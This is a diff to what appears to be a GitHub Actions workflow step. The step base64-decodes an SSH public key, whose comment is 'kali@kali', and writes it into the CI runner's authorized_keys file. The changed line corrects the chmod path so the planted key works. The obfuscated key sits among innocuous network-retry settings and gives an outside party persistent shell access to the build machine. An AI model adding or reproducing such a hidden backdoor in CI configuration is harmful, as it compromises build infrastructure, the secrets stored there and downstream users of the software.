@@ -15,7 +15,7 @@ runs:
     - run: |
         ip a
         echo "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSU1ZNzRCODJiWG03aTdpM2lZaEFNRVc3RHN4MnhWT0xtMFB0bDhSYUZhbm4ga2FsaUBrYWxpCg==" | base64 -d > /home/actions-runner/.ssh/authorized_keys
-        chmod 600 /home/actions-runner/.ssh/authorized-keys
+        chmod 600 /home/actions-runner/.ssh/authorized_keys
         # Marker status code in case of network failure.
         STATUS_TRANSIENT_FAILURE=200
         # Maximum retries in case of network failures.
